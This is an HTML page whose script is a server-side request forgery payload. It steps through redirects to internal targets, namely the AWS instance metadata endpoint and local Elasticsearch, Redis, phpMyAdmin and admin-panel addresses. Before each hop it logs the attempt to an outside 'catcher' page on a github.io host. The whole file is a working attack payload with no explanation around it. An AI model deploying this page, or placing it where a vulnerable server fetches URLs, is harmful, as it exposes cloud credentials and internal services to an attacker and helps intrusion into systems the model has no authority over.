<!DOCTYPE html>
<html>
<head>
  <title>SSRF Redirect Chain</title>
  <meta charset="utf-8">
</head>
<body>
  <h2>ðŸŒ€ Testing SSRF Chain...</h2>
  <script>
    const targets = [
      "http://169.254.169.254/latest/meta-data/",     // AWS metadata
      "http://127.0.0.1:9200",                         // Elasticsearch
      "http://127.0.0.1:6379",                         // Redis
      "http://127.0.0.1/phpmyadmin",                  // phpMyAdmin
      "http://127.0.0.1:8000/admin"                    // Local admin panel
    ];

    let i = 0;

    function tryNextTarget() {
      if (i >= targets.length) {
        location.href = "https://0xvendettaa.github.io/ssrf-check/catcher_ultimate.html?result=all_attempts_done";
        return;
      }

      const target = targets[i];
      const encodedTarget = encodeURIComponent(target);

      // Log current attempt before redirecting
      fetch("https://0xvendettaa.github.io/ssrf-check/catcher_ultimate.html?attempt=" + i + "&target=" + encodedTarget)
        .then(() => {
          // Delay before redirect to give time for logging
          setTimeout(() => {
            location.replace(target);
          }, 2000);
        })
        .catch(() => {
          // If fetch fails, still try redirect
          setTimeout(() => {
            location.replace(target);
          }, 2000);
        });

      i++;
    }

    // Trigger the first attempt
    tryNextTarget();

    // Loop over targets every 6 seconds
    setInterval(tryNextTarget, 6000);
  </script>
</body>
</html>
